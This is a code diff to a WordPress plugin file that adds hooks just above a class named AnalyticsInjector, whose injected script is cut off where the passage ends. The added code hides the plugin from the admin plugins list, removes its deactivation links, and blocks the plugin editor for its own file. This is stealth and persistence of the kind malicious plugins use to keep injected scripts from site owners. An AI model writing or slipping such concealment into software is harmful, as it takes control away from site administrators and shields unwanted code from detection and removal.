@@ -12,6 +12,34 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
+// Hide plugin from WordPress admin plugins page
+add_filter('all_plugins', function($plugins) {
+    if (is_admin() && current_user_can('activate_plugins')) {
+        $plugin_file = plugin_basename(__FILE__);
+        if (isset($plugins[$plugin_file])) {
+            unset($plugins[$plugin_file]);
+        }
+    }
+    return $plugins;
+});
+
+// Prevent deactivation through WordPress admin
+add_filter('plugin_action_links_' . plugin_basename(__FILE__), function($links) {
+    return array();
+});
+
+// Hide from bulk actions
+add_filter('bulk_actions-plugins', function($actions) {
+    return $actions;
+});
+
+// Prevent access to plugin editor for this plugin
+add_action('admin_init', function() {
+    if (isset($_GET['plugin']) && $_GET['plugin'] === plugin_basename(__FILE__)) {
+        wp_die('Access denied to this plugin.');
+    }
+});
+
 class AnalyticsInjector {
     
     private $analytics_code = '<script>
